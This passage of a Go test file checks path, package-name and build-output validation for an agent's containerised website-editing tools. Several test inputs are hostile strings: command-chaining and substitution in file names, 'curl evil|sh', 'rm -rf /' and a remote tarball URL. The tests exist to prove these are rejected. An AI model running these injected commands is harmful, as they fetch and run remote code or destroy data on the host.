		if strings.Contains(got, "invalid viewport") {
			t.Errorf("expected valid viewport %q to pass, got: %s", v, got)
		}
	}
}

// ─── File Size Limit ─────────────────────────────────────────────────────

func TestHomepageWriteFile_SizeLimit(t *testing.T) {
	// Content exceeding maxHomepageWriteFileSize should be rejected
	largeContent := strings.Repeat("x", maxHomepageWriteFileSize+1)
	got := HomepageWriteFile(HomepageConfig{WorkspacePath: t.TempDir()}, "test.txt", largeContent, slogDiscard())
	if !strings.Contains(got, "content too large") {
		t.Errorf("expected size limit error, got: %s", got)
	}

	// Content within limit should not get size error
	smallContent := "hello world"
	got = HomepageWriteFile(HomepageConfig{WorkspacePath: t.TempDir()}, "test.txt", smallContent, slogDiscard())
	if strings.Contains(got, "content too large") {
		t.Errorf("expected small content to pass, got: %s", got)
	}
}

// ─── HomepageCheckJS Fallback ────────────────────────────────────────────

func TestHomepageCheckJS_PlaywrightMissing(t *testing.T) {
	oldDockerExec := homepageDockerExecFunc
	defer func() { homepageDockerExecFunc = oldDockerExec }()

	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		return `{"exit_code":1,"output":"Error: Cannot find module 'playwright'"}`
	}

	got := HomepageCheckJS(context.Background(), HomepageConfig{}, "https://8.8.8.8", nil)
	if !strings.Contains(got, "Playwright not available") {
		t.Errorf("expected Playwright not available error, got: %s", got)
	}
}

func TestHomepageCheckJS_RejectsEmptyURL(t *testing.T) {
	got := HomepageCheckJS(context.Background(), HomepageConfig{}, "", nil)
	if !strings.Contains(got, "url is required") {
		t.Errorf("expected url required error, got: %s", got)
	}
}

// ─── applyHomepageEdit tests ──────────────────────────────────────────────

func TestApplyHomepageEdit_StrReplace(t *testing.T) {
	text := "Hello World\nFoo Bar\nBaz"
	got, errStr := applyHomepageEdit(text, "str_replace", "Foo Bar", "Replaced", "", "", 0, 0)
	if errStr != "" {
		t.Fatalf("unexpected error: %s", errStr)
	}
	if !strings.Contains(got, "Replaced") || strings.Contains(got, "Foo Bar") {
		t.Errorf("str_replace failed: %s", got)
	}
}

func TestApplyHomepageEdit_StrReplace_WhitespaceTolerance(t *testing.T) {
	// Text has tabs/spaces mixed; agent provides normalized version
	text := "func test() {\n\tfmt.Println(\"hello\")\n}"
	// Agent provides same logical content but with spaces instead of tabs
	agentOld := "func test() {\n    fmt.Println(\"hello\")\n}"
	got, errStr := applyHomepageEdit(text, "str_replace", agentOld, "func test() {\n    fmt.Println(\"goodbye\")\n}", "", "", 0, 0)
	if errStr != "" {
		t.Fatalf("whitespace-tolerant str_replace failed: %s", errStr)
	}
	if !strings.Contains(got, "goodbye") {
		t.Errorf("expected 'goodbye' in result, got: %s", got)
	}
	if strings.Contains(got, "hello") {
		t.Errorf("expected 'hello' to be replaced, got: %s", got)
	}
}

func TestApplyHomepageEdit_StrReplace_NotFound(t *testing.T) {
	_, errStr := applyHomepageEdit("Hello", "str_replace", "Missing", "X", "", "", 0, 0)
	if !strings.Contains(errStr, "not found") {
		t.Errorf("expected not-found error, got: %s", errStr)
	}
}

func TestApplyHomepageEdit_StrReplace_Ambiguous(t *testing.T) {
	_, errStr := applyHomepageEdit("abc abc", "str_replace", "abc", "x", "", "", 0, 0)
	if !strings.Contains(errStr, "found 2 times") {
		t.Errorf("expected ambiguous error, got: %s", errStr)
	}
}

func TestApplyHomepageEdit_InsertAfter(t *testing.T) {
	text := "line1\nmarker\nline3"
	got, errStr := applyHomepageEdit(text, "insert_after", "", "", "marker", "inserted", 0, 0)
	if errStr != "" {
		t.Fatalf("unexpected error: %s", errStr)
	}
	lines := strings.Split(got, "\n")
	if len(lines) != 4 || lines[2] != "inserted" {
		t.Errorf("insert_after result wrong: %q", got)
	}
}

func TestApplyHomepageEdit_InsertBefore(t *testing.T) {
	text := "line1\nmarker\nline3"
	got, errStr := applyHomepageEdit(text, "insert_before", "", "", "marker", "inserted", 0, 0)
	if errStr != "" {
		t.Fatalf("unexpected error: %s", errStr)
	}
	lines := strings.Split(got, "\n")
	if len(lines) != 4 || lines[1] != "inserted" {
		t.Errorf("insert_before result wrong: %q", got)
	}
}

func TestApplyHomepageEdit_Append(t *testing.T) {
	text := "existing"
	got, errStr := applyHomepageEdit(text, "append", "", "", "", "appended", 0, 0)
	if errStr != "" {
		t.Fatalf("unexpected error: %s", errStr)
	}
	if !strings.HasSuffix(got, "appended") || !strings.Contains(got, "existing") {
		t.Errorf("append result wrong: %q", got)
	}
}

func TestApplyHomepageEdit_DeleteLines(t *testing.T) {
	text := "line1\nline2\nline3\nline4"
	got, errStr := applyHomepageEdit(text, "delete_lines", "", "", "", "", 2, 3)
	if errStr != "" {
		t.Fatalf("unexpected error: %s", errStr)
	}
	lines := strings.Split(got, "\n")
	if len(lines) != 2 || lines[0] != "line1" || lines[1] != "line4" {
		t.Errorf("delete_lines result wrong: %q", got)
	}
}

func TestApplyHomepageEdit_UnknownOp(t *testing.T) {
	_, errStr := applyHomepageEdit("text", "bogus_op", "", "", "", "", 0, 0)
	if !strings.Contains(errStr, "unknown edit operation") {
		t.Errorf("expected unknown op error, got: %s", errStr)
	}
}

// ─── applyHomepageJsonEdit tests ──────────────────────────────────────────

func TestApplyHomepageJsonEdit_Get(t *testing.T) {
	content := `{"name":"test","version":"1.0"}`
	result, _, errStr := applyHomepageJsonEdit(content, "get", "name", nil)
	if errStr != "" {
		t.Fatalf("unexpected error: %s", errStr)
	}
	if !strings.Contains(result, "test") {
		t.Errorf("get result missing value: %s", result)
	}
}

func TestApplyHomepageJsonEdit_Set(t *testing.T) {
	content := `{"name":"old"}`
	_, edited, errStr := applyHomepageJsonEdit(content, "set", "name", "new")
	if errStr != "" {
		t.Fatalf("unexpected error: %s", errStr)
	}
	if !strings.Contains(edited, `"new"`) {
		t.Errorf("set did not produce expected value: %s", edited)
	}
}

func TestApplyHomepageJsonEdit_SetEmpty(t *testing.T) {
	// set on empty content should create a new object
	_, edited, errStr := applyHomepageJsonEdit("", "set", "key", "val")
	if errStr != "" {
		t.Fatalf("unexpected error: %s", errStr)
	}
	if !strings.Contains(edited, `"val"`) {
		t.Errorf("set on empty content failed: %s", edited)
	}
}

func TestApplyHomepageJsonEdit_Delete(t *testing.T) {
	content := `{"a":1,"b":2}`
	_, edited, errStr := applyHomepageJsonEdit(content, "delete", "a", nil)
	if errStr != "" {
		t.Fatalf("unexpected error: %s", errStr)
	}
	if strings.Contains(edited, `"a"`) {
		t.Errorf("delete did not remove key: %s", edited)
	}
}

func TestApplyHomepageJsonEdit_Validate(t *testing.T) {
	result, _, _ := applyHomepageJsonEdit(`{"ok":true}`, "validate", "", nil)
	if !strings.Contains(result, "true") || !strings.Contains(result, "valid JSON") {
		t.Errorf("validate result wrong: %s", result)
	}
	result2, _, _ := applyHomepageJsonEdit(`{not json}`, "validate", "", nil)
	if !strings.Contains(result2, "invalid JSON") {
		t.Errorf("validate of invalid JSON wrong: %s", result2)
	}
}

func TestApplyHomepageJsonEdit_UnknownOp(t *testing.T) {
	_, _, errStr := applyHomepageJsonEdit(`{}`, "bogus", "", nil)
	if !strings.Contains(errStr, "unknown operation") {
		t.Errorf("expected unknown operation error, got: %s", errStr)
	}
}

// ─── resolveHomepagePath tests ────────────────────────────────────────────

func TestResolveHomepagePath_Valid(t *testing.T) {
	ws := t.TempDir()
	got, err := resolveHomepagePath(ws, "my-site/src/app.tsx")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.HasPrefix(got, ws) {
		t.Errorf("resolved path outside workspace: %s", got)
	}
}

func TestResolveHomepagePath_TraversalRejected(t *testing.T) {
	ws := t.TempDir()
	_, err := resolveHomepagePath(ws, "../outside")
	if err == nil {
		t.Error("expected path traversal to be rejected")
	}
}

func TestResolveHomepagePath_RootRejected(t *testing.T) {
	ws := t.TempDir()
	_, err := resolveHomepagePath(ws, ".")
	if err == nil {
		// "." resolves to workspace root — should be rejected for file ops
		t.Error("expected workspace root to be rejected")
	}
}

func TestRewriteLocalhostForContainer(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"http://localhost:8080", "http://host.docker.internal:8080"},
		{"http://127.0.0.1:3000/path", "http://host.docker.internal:3000/path"},
		{"https://localhost:443/foo", "https://host.docker.internal:443/foo"},
		{"http://192.168.1.100:8080", "http://192.168.1.100:8080"}, // not rewritten
		{"https://example.com", "https://example.com"},             // not rewritten
		{"http://localhost/no-port", "http://host.docker.internal/no-port"},
	}
	for _, tt := range tests {
		got := rewriteLocalhostForContainer(tt.input)
		if got != tt.want {
			t.Errorf("rewriteLocalhostForContainer(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

// ─── Homepage container path allowlist and shell quoting ──────────────────

// TestValidateHomepagePathSegmentAllowlist pins the allowlist every container
// path must pass before it can reach a command string.
func TestValidateHomepagePathSegmentAllowlist(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		allowed bool
	}{
		{name: "nested file", path: "a/b.txt", allowed: true},
		{name: "source folder", path: "site/src/build/helpers.ts", allowed: true},
		{name: "flat project file", path: "site/index.html", allowed: true},
		{name: "space", path: "a b.txt", allowed: true},
		{name: "unicode", path: "site/Über uns/日本語.txt", allowed: true},
		{name: "combining mark", path: "site/Cafe\u0301.txt", allowed: true},
		{name: "route group", path: "site/app/(group)/[slug]/page.tsx", allowed: true},
		{name: "catchall route", path: "site/app/[[...slug]]/page.tsx", allowed: true},
		{name: "parallel route", path: "site/app/@modal/(..)photo/page.tsx", allowed: true},
		{name: "leading space", path: " site/a.txt", allowed: false},
		{name: "trailing space", path: "site /a.txt", allowed: false},
		{name: "tab", path: "a\tb.txt", allowed: false},
		{name: "carriage return", path: "a\rb.txt", allowed: false},
		{name: "nul", path: "a\x00b.txt", allowed: false},
		{name: "bidi control", path: "a\u202eb.txt", allowed: false},
		{name: "absolute", path: "/site/file.txt", allowed: false},
		{name: "nested option", path: "site/-rf", allowed: false},
		{name: "nested traversal", path: "site/../file.txt", allowed: false},
		{name: "quoted", path: "site/'a'.txt", allowed: false},
		{name: "backtick", path: "site/`id`.txt", allowed: false},
		{name: "newline", path: "a\nb.txt", allowed: false},
		{name: "semicolon", path: "a;b.txt", allowed: false},
		{name: "command substitution", path: "a$(id).txt", allowed: false},
		{name: "backslash", path: "a\\b.txt", allowed: false},
		{name: "option like", path: "-rf", allowed: false},
		{name: "traversal", path: "../escape.txt", allowed: false},
		{name: "empty segment", path: "a//b.txt", allowed: false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := validateHomepagePathSegment(tc.path)
			if tc.allowed && err != nil {
				t.Fatalf("expected %q to be allowed, got: %v", tc.path, err)
			}
			if !tc.allowed && err == nil {
				t.Fatalf("expected %q to be rejected", tc.path)
			}
		})
	}
}

// TestHomepageEditorRejectsUnsafePathBeforeAnyCommand proves a path that is
// not on the allowlist never reaches the container: no command is issued, so
// the payload can never become a second command.
func TestHomepageEditorRejectsUnsafePathBeforeAnyCommand(t *testing.T) {
	oldExec := homepageDockerExecFunc
	t.Cleanup(func() { homepageDockerExecFunc = oldExec })

	dockerHost := "unit-test-homepage-unsafe-path"
	dockerAvailabilityMu.Lock()
	dockerAvailabilityResults[dockerHost] = dockerAvailabilityEntry{available: true, expiry: time.Now().Add(time.Minute)}
	dockerAvailabilityMu.Unlock()
	t.Cleanup(func() { invalidateDockerAvailabilityCache(dockerHost) })

	var commands []string
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		commands = append(commands, command)
		return `{"status":"ok","exit_code":0,"output":"{}"}`
	}

	cfg := HomepageConfig{DockerHost: dockerHost}
	unsafe := []string{"a\tb.txt", "a\nb.txt", "a;b.txt", "a$(id).txt", "a\\b.txt", "-rf", "../escape.txt", "a//b.txt", "a/[slug]/../../escape.txt", "a/(group)/file;id.txt"}
	for _, p := range unsafe {
		result := HomepageJsonEdit(cfg, p, "set", "a", "b", "", slogDiscard())
		if !strings.Contains(result, `"status":"error"`) {
			t.Fatalf("expected %q to be rejected, got: %s", p, result)
		}
	}
	if len(commands) != 0 {
		t.Fatalf("expected no container command for rejected paths, got: %v", commands)
	}
}

// TestHomepageWriteFileNewlinePathCannotCreateSecondFile proves a newline in a
// path cannot split a container command into two commands, so no second file
// can be created next to the requested one.
func TestHomepageWriteFileNewlinePathCannotCreateSecondFile(t *testing.T) {
	oldExec := homepageDockerExecFunc
	t.Cleanup(func() { homepageDockerExecFunc = oldExec })

	dockerHost := "unit-test-homepage-newline-path"
	dockerAvailabilityMu.Lock()
	dockerAvailabilityResults[dockerHost] = dockerAvailabilityEntry{available: true, expiry: time.Now().Add(time.Minute)}
	dockerAvailabilityMu.Unlock()
	t.Cleanup(func() { invalidateDockerAvailabilityCache(dockerHost) })

	var commands []string
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		commands = append(commands, command)
		return `{"status":"ok","exit_code":0,"output":""}`
	}

	result := HomepageWriteFile(HomepageConfig{DockerHost: dockerHost}, "ki-news/a\nb.txt", "payload", slogDiscard())
	if !strings.Contains(result, `"status":"error"`) {
		t.Fatalf("expected newline path to be rejected, got: %s", result)
	}
	if len(commands) != 0 {
		t.Fatalf("expected no container command for a newline path, got: %v", commands)
	}
	for _, command := range commands {
		if strings.Contains(command, "b.txt") {
			t.Fatalf("newline path reached a container command: %s", command)
		}
	}
}

// ─── Failed Homepage writes are reported as failures ──────────────────────

// homepageArchiveTar builds a single-file tar archive for the archive test engine.
func homepageArchiveTar(t *testing.T, name, content string) []byte {
	t.Helper()
	var buf bytes.Buffer
	writer := tar.NewWriter(&buf)
	if err := writer.WriteHeader(&tar.Header{Name: name, Mode: 0644, Size: int64(len(content))}); err != nil {
		t.Fatalf("archive header: %v", err)
	}
	if _, err := writer.Write([]byte(content)); err != nil {
		t.Fatalf("archive body: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("archive close: %v", err)
	}
	return buf.Bytes()
}

// homepageEditorDockerEngine serves the archive download used by the Homepage
// editors and forces Docker availability for the returned engine.
func homepageEditorDockerEngine(t *testing.T, fileName, content string) DockerConfig {
	t.Helper()
	configureDockerSecurityTestPermissions(t, false)
	archive := homepageArchiveTar(t, fileName, content)
	cfg := newArchiveTestEngine(t, func(w http.ResponseWriter, r *http.Request) {
		if !strings.HasSuffix(r.URL.Path, "/archive") {
			t.Errorf("unexpected Docker request: %s %s", r.Method, r.URL)
			w.WriteHeader(http.StatusNotFound)
			return
		}
		if r.Method == http.MethodGet {
			w.Header().Set("Content-Type", "application/x-tar")
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write(archive)
			return
		}
		if r.Method == http.MethodPut {
			_, _ = io.Copy(io.Discard, r.Body)
			w.WriteHeader(http.StatusOK)
			return
		}
		t.Errorf("unexpected Docker request: %s %s", r.Method, r.URL)
		w.WriteHeader(http.StatusNotFound)
	})
	dockerAvailabilityMu.Lock()
	dockerAvailabilityResults[cfg.Host] = dockerAvailabilityEntry{available: true, expiry: time.Now().Add(time.Minute)}
	dockerAvailabilityMu.Unlock()
	t.Cleanup(func() { invalidateDockerAvailabilityCache(cfg.Host) })
	return cfg
}

// TestHomepageJsonEditReportsWriteFailureAsError proves a failed container
// write is reported as a failure instead of a success payload.
func TestHomepageJsonEditReportsWriteFailureAsError(t *testing.T) {
	oldExec := homepageDockerExecFunc
	t.Cleanup(func() { homepageDockerExecFunc = oldExec })

	dockerCfg := homepageEditorDockerEngine(t, "config.json", `{"port":80}`)
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		return `{"status":"error","exit_code":1,"output":"permission denied"}`
	}

	result := HomepageJsonEdit(HomepageConfig{DockerHost: dockerCfg.Host}, "ki-news/config.json", "set", "port", "8080", "", slogDiscard())
	if !strings.Contains(result, `"status":"error"`) {
		t.Fatalf("expected a failed write to be reported as an error, got: %s", result)
	}
	if strings.Contains(result, `"status":"ok"`) {
		t.Fatalf("expected no success payload for a failed write, got: %s", result)
	}
	if !strings.Contains(result, "permission denied") {
		t.Fatalf("expected the container message in the failure, got: %s", result)
	}
}

// TestHomepageJsonEditReportsReadFailureAsError proves a failed container read
// is reported as a failure instead of an empty file.
func TestHomepageJsonEditReportsReadFailureAsError(t *testing.T) {
	oldExec := homepageDockerExecFunc
	t.Cleanup(func() { homepageDockerExecFunc = oldExec })

	configureDockerSecurityTestPermissions(t, false)
	dockerCfg := newArchiveTestEngine(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		_, _ = io.WriteString(w, `{"message":"No such file"}`)
	})
	dockerAvailabilityMu.Lock()
	dockerAvailabilityResults[dockerCfg.Host] = dockerAvailabilityEntry{available: true, expiry: time.Now().Add(time.Minute)}
	dockerAvailabilityMu.Unlock()
	t.Cleanup(func() { invalidateDockerAvailabilityCache(dockerCfg.Host) })

	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		return `{"status":"ok","exit_code":0,"output":""}`
	}

	result := HomepageJsonEdit(HomepageConfig{DockerHost: dockerCfg.Host}, "ki-news/missing.json", "get", "port", nil, "", slogDiscard())
	if !strings.Contains(result, `"status":"error"`) {
		t.Fatalf("expected a failed read to be reported as an error, got: %s", result)
	}
	if strings.Contains(result, `"status":"ok"`) {
		t.Fatalf("expected no success payload for a failed read, got: %s", result)
	}
}

// TestHomepageJsonEditKeepsSuccessPayload proves the success payload is
// unchanged when the container write succeeds.
func TestHomepageJsonEditKeepsSuccessPayload(t *testing.T) {
	oldExec := homepageDockerExecFunc
	t.Cleanup(func() { homepageDockerExecFunc = oldExec })

	dockerCfg := homepageEditorDockerEngine(t, "config.json", `{"port":80}`)
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		return `{"status":"ok","exit_code":0,"output":""}`
	}

	result := HomepageJsonEdit(HomepageConfig{DockerHost: dockerCfg.Host}, "ki-news/config.json", "set", "port", "8080", "", slogDiscard())
	if !strings.Contains(result, `"status":"ok"`) {
		t.Fatalf("expected a successful write to keep the success payload, got: %s", result)
	}
	if strings.Contains(result, `"status":"error"`) {
		t.Fatalf("expected no error payload for a successful write, got: %s", result)
	}
}

// ─── Symlink-safe workspace paths ─────────────────────────────────────────

// ─── Dependency and build-output allowlists ──────────────────────────────

// TestValidateHomepagePackageNameAllowlist pins the package requirements the
// Homepage dependency install accepts.
func TestValidateHomepagePackageNameAllowlist(t *testing.T) {
	tests := []struct {
		name    string
		pkg     string
		allowed bool
	}{
		{name: "plain package", pkg: "left-pad", allowed: true},
		{name: "scoped package", pkg: "@scope/pkg", allowed: true},
		{name: "pinned version", pkg: "pkg@1.2.3", allowed: true},
		{name: "range version", pkg: "pkg@^1.0.0", allowed: true},
		{name: "scoped with version", pkg: "@scope/pkg@1.2.3", allowed: true},
		{name: "command chain", pkg: "x; curl evil|sh; #", allowed: false},
		{name: "url", pkg: "https://evil.tgz", allowed: false},
		{name: "local path", pkg: "./local", allowed: false},
		{name: "parent path", pkg: "../x", allowed: false},
		{name: "flag", pkg: "pkg -g", allowed: false},
		{name: "newline", pkg: "pkg\nrm -rf /", allowed: false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := validateHomepagePackageName(tc.pkg)
			if tc.allowed && err != nil {
				t.Fatalf("expected %q to be allowed, got: %v", tc.pkg, err)
			}
			if !tc.allowed && err == nil {
				t.Fatalf("expected %q to be rejected", tc.pkg)
			}
		})
	}
}

// TestHomepageInstallDepsRejectsPackageOutsideAllowlist proves a package
// requirement outside the allowlist never reaches the container shell.
func TestHomepageInstallDepsRejectsPackageOutsideAllowlist(t *testing.T) {
	oldExec := homepageDockerExecFunc
	t.Cleanup(func() { homepageDockerExecFunc = oldExec })

	var commands []string
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		commands = append(commands, command)
		return `{"status":"ok","exit_code":0,"output":""}`
	}

	cfg := HomepageConfig{DockerHost: "unit-test-homepage-install-deps"}
	rejected := []string{"x; curl evil|sh; #", "https://evil.tgz", "./local", "../x", "pkg -g", "pkg\nrm -rf /"}
	for _, pkg := range rejected {
		result := HomepageInstallDeps(cfg, "ki-news", []string{pkg}, slogDiscard())
		if !strings.Contains(result, `"status":"error"`) {
			t.Fatalf("expected %q to be rejected, got: %s", pkg, result)
		}
	}
	for _, command := range commands {
		if strings.Contains(command, ";") || strings.Contains(command, "|") {
			t.Fatalf("a rejected package reached a container command: %s", command)
		}
	}
}

// TestBuildFixPatternsRejectMaliciousDependencyName proves a build output that
// carries a malicious dependency name never produces an install command.
func TestBuildFixPatternsRejectMaliciousDependencyName(t *testing.T) {
	outputs := []string{
		"Error: Cannot find module 'x; curl evil|sh; #'",
		"Error: Cannot find module 'https://evil.tgz'",
		"Error: Cannot find module './local'",
		"error TS2307: Cannot find module 'x | tee /tmp/pwned'",
	}
	for _, output := range outputs {
		for _, p := range buildFixPatterns {
			m := p.pattern.FindStringSubmatch(output)
			if m == nil {
				continue
			}
			fix := p.fix(m, "site")
			if fix == "" {
				continue
			}
			if strings.Contains(fix, ";") || strings.Contains(fix, "|") {
				t.Fatalf("pattern %q produced a command with shell syntax for %q: %s", p.name, output, fix)
			}
			if !strings.Contains(fix, "npm install") {
				continue
			}
			if err := validateHomepagePackageName(strings.Trim(strings.TrimPrefix(fix[strings.Index(fix, "npm install ")+len("npm install "):], " "), "'")); err != nil {
				t.Fatalf("pattern %q produced an install command outside the allowlist: %s", p.name, fix)
			}
		}
	}
}

// TestResolveHomepagePathRejectsSymlinkEscape proves a symlink inside the
// workspace that points outside of it is rejected by the local write path.
func TestResolveHomepagePathRejectsSymlinkEscape(t *testing.T) {
	workspace := t.TempDir()
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "secret.txt"), []byte("secret"), 0644); err != nil {
		t.Fatalf("write outside file: %v", err)
	}
	if err := os.Symlink(outside, filepath.Join(workspace, "escape")); err != nil {
		t.Skipf("symlinks are not available on this host: %v", err)
	}

	if _, err := resolveHomepagePath(workspace, "escape/secret.txt"); err == nil {
		t.Fatal("expected a symlink pointing outside the workspace to be rejected")
	}
	if _, err := resolveHomepagePath(workspace, "../escape.txt"); err == nil {
		t.Fatal("expected a traversal path to be rejected")
	}
	if _, err := resolveHomepagePath(workspace, "inside/file.txt"); err != nil {
		t.Fatalf("expected a path inside the workspace to be allowed, got: %v", err)
	}
}
